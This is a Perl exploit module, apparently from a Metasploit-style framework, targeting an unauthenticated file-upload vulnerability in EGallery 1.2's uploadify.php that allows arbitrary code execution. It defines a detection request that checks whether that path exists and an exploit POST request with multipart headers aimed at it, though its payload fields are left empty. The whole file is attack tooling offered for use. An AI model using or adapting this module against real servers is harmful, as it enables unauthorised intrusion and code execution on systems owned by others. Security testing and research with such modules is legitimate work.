package EGALLERY::MSF::EgalleryUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "EgalleryUploadExec";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/egallery/uploadify.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /egallery/uploadify.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a vulnerability found in EGallery 1.2 By abusing the

        uploadify.php file, a malicious user can upload a file to the egallery/ directory

        without any authentication, which results in arbitrary code execution. The module

        has been tested successfully on Ubuntu 10.04.

      ",
  METHOD => "GET",
  MSF_MODULE => "egallery_upload_exec",
  OSVDB => 83891,
  PATHS => ["sample"],
  REFERENCES => [
    "http://www.opensyscom.fr/Actualites/egallery-arbitrary-file-upload-vulnerability.html",
  ],
  VARIABLES => {
    'URI' =>       { DESCRIPTION => "", VALUE => "" },
    'PAYLOAD_NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'BOUNDARY' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "The base path to EGallery", VALUE => "/sample" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT10 => {
      METHOD       => 'POST',
      PATH   => 'egallery/uploadify.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #10 Request : [POST] /egallery/uploadify.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=deade2e',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
